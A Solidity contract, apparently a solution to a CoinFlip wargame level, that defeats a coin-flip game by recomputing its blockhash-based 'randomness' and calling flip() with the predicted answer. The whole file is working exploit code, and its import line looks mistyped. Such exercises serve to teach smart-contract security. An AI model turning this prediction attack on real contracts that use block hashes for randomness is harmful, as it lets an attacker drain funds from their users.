//SPDX-License-Identifier: MIT

import {CoinFlip_sol} from "../src/CointFlip.sol";


pragma solidity ^0.8.18;

interface ICoinFlip{
    function flip(bool _guess) external returns(bool);
}

contract AttackCoinFlip {
    ICoinFlip public targetContract;
    
    constructor(address _targetContract){
        targetContract = ICoinFlip(_targetContract);
    }

    function attack() public{
    
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = (coinFlip == 1);

        targetContract.flip(side);
    }

}
